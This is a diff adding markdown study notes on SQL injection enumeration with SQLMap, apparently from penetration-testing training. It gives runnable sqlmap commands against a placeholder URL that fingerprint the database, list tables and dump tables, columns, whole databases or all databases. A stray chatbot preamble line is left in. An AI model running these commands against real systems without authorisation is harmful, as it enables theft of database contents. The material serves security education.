@@ -405,3 +405,114 @@ SQLMap provides various options to fine-tune SQL injection (SQLi) attempts, impr
 - **Advanced Tuning**: Adjust settings for specific vulnerabilities like login pages, complex databases, or unique SQLi cases.
 
 ---
+
+Here is a markdown version of the notes based on the content you've provided:
+
+---
+
+# Database Enumeration
+
+## **Overview**
+Enumeration is a critical part of an SQL injection (SQLi) attack, occurring after the vulnerability is successfully detected. It involves extracting valuable information from a vulnerable database, which is typically achieved through tools like SQLMap. SQLMap automates the process of SQLi exploitation and data retrieval.
+
+## **SQLMap Data Exfiltration**
+SQLMap uses predefined queries for various Database Management Systems (DBMSs). The queries are stored in the `queries.xml` file, with specific commands for each supported DBMS, such as MySQL. Here's an example of the relevant sections for MySQL:
+
+```xml
+<root>
+    <dbms value="MySQL">
+        <cast query="CAST(%s AS NCHAR)"/>
+        <length query="CHAR_LENGTH(%s)"/>
+        <isnull query="IFNULL(%s,' ')"/>
+        <banner query="VERSION()"/>
+        <current_user query="CURRENT_USER()"/>
+        <current_db query="DATABASE()"/>
+        <hostname query="@@HOSTNAME"/>
+        ...
+    </dbms>
+</root>
+```
+
+### **Example Queries for MySQL**:
+- **Database version**: `VERSION()`
+- **Current user**: `CURRENT_USER()`
+- **Current database**: `DATABASE()`
+- **Hostname**: `@@HOSTNAME`
+
+## **Basic Database Data Enumeration**
+Once an SQL injection vulnerability is detected, the enumeration process begins with retrieving basic information such as:
+- **Database version** (`--banner`)
+- **Current user** (`--current-user`)
+- **Current database** (`--current-db`)
+- **Checking if the user has DBA privileges** (`--is-dba`)
+
+### Example SQLMap Command for Basic Enumeration:
+```bash
+$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
+```
+
+### **Important Notes**:
+- The **root** user in a database context does not necessarily relate to the OS-level root user.
+- The **DBA** role typically refers to database administration privileges and not operating system permissions.
+
+## **Table Enumeration**
+After identifying the current database, the next step is usually to retrieve the table names using the `--tables` option.
+
+### Example SQLMap Command for Table Enumeration:
+```bash
+$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
+```
+
+## **Dumping Table Data**
+Once a target table is identified, we can dump its data using the `--dump` option.
+
+### Example SQLMap Command for Data Dump:
+```bash
+$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
+```
+
+The data is saved as a CSV file:
+```
+/home/user/.local/share/sqlmap/output/www.example.com/dump/testdb/users.csv
+```
+
+### **Customizing Data Dump**:
+1. **Dump Specific Columns**:
+   Use `-C` to specify columns:
+   ```bash
+   $ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
+   ```
+
+2. **Limit Rows**:
+   Use `--start` and `--stop` to limit the range of rows:
+   ```bash
+   $ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
+   ```
+
+3. **Conditional Enumeration**:
+   Retrieve data based on specific conditions using `--where`:
+   ```bash
+   $ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
+   ```
+## **Full Database Enumeration**
+You can dump all data from a database without specifying individual tables using `--dump -D`.
+
+### Example Command for Full Database Dump:
+```bash
+$ sqlmap -u "http://www.example.com/?id=1" --dump -D testdb
+```
+
+### Dump All Databases:
+Use the `--dump-all` option to dump all databases:
+```bash
+$ sqlmap -u "http://www.example.com/?id=1" --dump-all
+```
+
+### **Excluding System Databases**:
+System databases are typically not relevant for penetration tests, so the `--exclude-sysdbs` option can be used to skip them:
+```bash
+$ sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs
+```
+
+---
+
